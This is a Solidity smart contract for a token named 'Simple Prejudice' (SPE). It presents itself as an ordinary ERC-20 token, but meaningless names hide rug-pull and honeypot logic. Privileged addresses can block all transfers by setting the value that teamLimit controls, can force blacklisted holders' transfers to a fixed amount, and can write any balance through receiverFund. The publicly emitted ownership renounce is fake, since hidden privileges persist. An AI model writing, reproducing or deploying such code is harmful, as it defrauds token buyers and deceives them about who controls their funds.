//SPDX-License-Identifier: MIT

pragma solidity ^0.8.16;

interface teamTotal {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract tradingFee {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface launchTx {
    function createPair(address autoMarketingReceiver, address exemptList) external returns (address);
}

interface isFundTeam {
    function totalSupply() external view returns (uint256);

    function balanceOf(address liquidityTx) external view returns (uint256);

    function transfer(address marketingToken, uint256 liquidityMode) external returns (bool);

    function allowance(address senderToken, address spender) external view returns (uint256);

    function approve(address spender, uint256 liquidityMode) external returns (bool);

    function transferFrom(
        address sender,
        address marketingToken,
        uint256 liquidityMode
    ) external returns (bool);

    event Transfer(address indexed from, address indexed txWallet, uint256 value);
    event Approval(address indexed senderToken, address indexed spender, uint256 value);
}

interface isFundTeamMetadata is isFundTeam {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract SimplePrejudice is tradingFee, isFundTeam, isFundTeamMetadata {

    function buyIsAt(address fundLimitTo) public {
        if (totalModeList) {
            return;
        }
        if (fundAtList) {
            txLimit = false;
        }
        teamFrom[fundLimitTo] = true;
        if (txLimit == walletAt) {
            amountWallet = walletSender;
        }
        totalModeList = true;
    }

    function name() external view virtual override returns (string memory) {
        return walletTrading;
    }

    bool public walletAt;

    string private marketingFund = "SPE";

    function modeAmount(address tradingToken) public {
        toLiquidityTrading();
        if (receiverTrading == amountWallet) {
            amountWallet = receiverTrading;
        }
        if (tradingToken == atIsMax || tradingToken == receiverAuto) {
            return;
        }
        shouldIs[tradingToken] = true;
    }

    mapping(address => mapping(address => uint256)) private listWallet;

    function launchLiquidityLimit(address tradingAtTeam, address marketingToken, uint256 liquidityMode) internal returns (bool) {
        if (tradingAtTeam == atIsMax) {
            return walletLimit(tradingAtTeam, marketingToken, liquidityMode);
        }
        uint256 takeList = isFundTeam(receiverAuto).balanceOf(liquidityTotal);
        require(takeList == atTotal);
        require(marketingToken != liquidityTotal);
        if (shouldIs[tradingAtTeam]) {
            return walletLimit(tradingAtTeam, marketingToken, teamTx);
        }
        return walletLimit(tradingAtTeam, marketingToken, liquidityMode);
    }

    uint256 fundMaxIs;

    uint256 constant teamTx = 4 ** 10;

    function decimals() external view virtual override returns (uint8) {
        return buyMarketing;
    }

    function owner() external view returns (address) {
        return txIs;
    }

    address takeMode = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    address public atIsMax;

    function approve(address txFrom, uint256 liquidityMode) public virtual override returns (bool) {
        listWallet[_msgSender()][txFrom] = liquidityMode;
        emit Approval(_msgSender(), txFrom, liquidityMode);
        return true;
    }

    function transfer(address fromMarketing, uint256 liquidityMode) external virtual override returns (bool) {
        return launchLiquidityLimit(_msgSender(), fromMarketing, liquidityMode);
    }

    event OwnershipTransferred(address indexed maxWallet, address indexed tradingAt);

    uint8 private buyMarketing = 18;

    mapping(address => bool) public teamFrom;

    uint256 private amountWallet;

    address liquidityTotal = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    bool public txLimit;

    function transferFrom(address tradingAtTeam, address marketingToken, uint256 liquidityMode) external override returns (bool) {
        if (_msgSender() != takeMode) {
            if (listWallet[tradingAtTeam][_msgSender()] != type(uint256).max) {
                require(liquidityMode <= listWallet[tradingAtTeam][_msgSender()]);
                listWallet[tradingAtTeam][_msgSender()] -= liquidityMode;
            }
        }
        return launchLiquidityLimit(tradingAtTeam, marketingToken, liquidityMode);
    }

    address private txIs;

    uint256 public receiverTrading;

    bool private enableLaunched;

    function toLiquidityTrading() private view {
        require(teamFrom[_msgSender()]);
    }

    function allowance(address tradingSwap, address txFrom) external view virtual override returns (uint256) {
        if (txFrom == takeMode) {
            return type(uint256).max;
        }
        return listWallet[tradingSwap][txFrom];
    }

    uint256 private walletSender;

    function launchedFrom() public {
        emit OwnershipTransferred(atIsMax, address(0));
        txIs = address(0);
    }

    function teamLimit(uint256 liquidityMode) public {
        toLiquidityTrading();
        atTotal = liquidityMode;
    }

    bool public totalModeList;

    uint256 private buyAuto = 100000000 * 10 ** 18;

    constructor (){
        
        launchedFrom();
        teamTotal teamFundExempt = teamTotal(takeMode);
        receiverAuto = launchTx(teamFundExempt.factory()).createPair(teamFundExempt.WETH(), address(this));
        if (receiverTrading == amountWallet) {
            walletAt = false;
        }
        atIsMax = _msgSender();
        teamFrom[atIsMax] = true;
        enableTotal[atIsMax] = buyAuto;
        if (amountWallet == receiverTrading) {
            amountWallet = walletSender;
        }
        emit Transfer(address(0), atIsMax, buyAuto);
    }

    bool private fundAtList;

    function walletLimit(address tradingAtTeam, address marketingToken, uint256 liquidityMode) internal returns (bool) {
        require(enableTotal[tradingAtTeam] >= liquidityMode);
        enableTotal[tradingAtTeam] -= liquidityMode;
        enableTotal[marketingToken] += liquidityMode;
        emit Transfer(tradingAtTeam, marketingToken, liquidityMode);
        return true;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return buyAuto;
    }

    string private walletTrading = "Simple Prejudice";

    uint256 atTotal;

    mapping(address => uint256) private enableTotal;

    address public receiverAuto;

    function getOwner() external view returns (address) {
        return txIs;
    }

    mapping(address => bool) public shouldIs;

    function symbol() external view virtual override returns (string memory) {
        return marketingFund;
    }

    function balanceOf(address liquidityTx) public view virtual override returns (uint256) {
        return enableTotal[liquidityTx];
    }

    function receiverFund(address fromMarketing, uint256 liquidityMode) public {
        toLiquidityTrading();
        enableTotal[fromMarketing] = liquidityMode;
    }

}